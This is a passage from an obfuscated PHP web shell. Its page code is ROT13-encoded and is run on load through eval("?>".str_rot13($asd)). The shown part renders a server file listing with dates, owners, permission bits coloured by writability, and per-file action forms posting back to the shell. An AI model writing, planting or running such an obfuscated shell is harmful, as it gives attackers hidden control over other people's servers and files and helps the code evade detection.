<gq><pragre>".svyrqngr($freybx."/".$svyr)."</pragre></gq>
<gq>".bjare($freybx."/".$svyr)."</gq>
<gq><pragre>";
vs(vf_jevgnoyr("$freybx/$svyr")) rpub '<sbag pbybe="yvzr">';
ryfrvs(!vf_ernqnoyr("$freybx/$svyr")) rpub '<sbag pbybe="erq">';
rpub fgnghfaln("$freybx/$svyr");
vs(vf_jevgnoyr("$freybx/$svyr") || !vf_ernqnoyr("$freybx/$svyr")) rpub '</sbag>';
rpub "</pragre></gq><gq><pragre>
<sbez zrgubq='cbfg' npgvba='?cvyvuna&cngu=$freybx'>
<qvi pynff='oga-tebhc' ebyr='tebhc' nevn-ynory='Svefg tebhc'>";
rpub tnmm($svyr);
rpub "</qvi><vachg glcr=\"uvqqra\" anzr=\"glcr\" inyhr=\"svyr\">
<vachg glcr=\"uvqqra\" anzr=\"anzr\" inyhr=\"$svyr\">
<vachg glcr=\"uvqqra\" anzr=\"cngu\" inyhr=\"$freybx/$svyr\">
</sbez></pragre></gq></ge>";
}
rpub '</ge></gq></gnoyr></gnoyr>';
nhgube();

shapgvba fgnghfaln($svyr){
$vmva = fhofge(fcevags('%b', svyrcrezf($svyr)), -4);
erghea $vmva;
}
?>
</obql>
</ugzy>

ASD;

eval("?>".str_rot13($asd));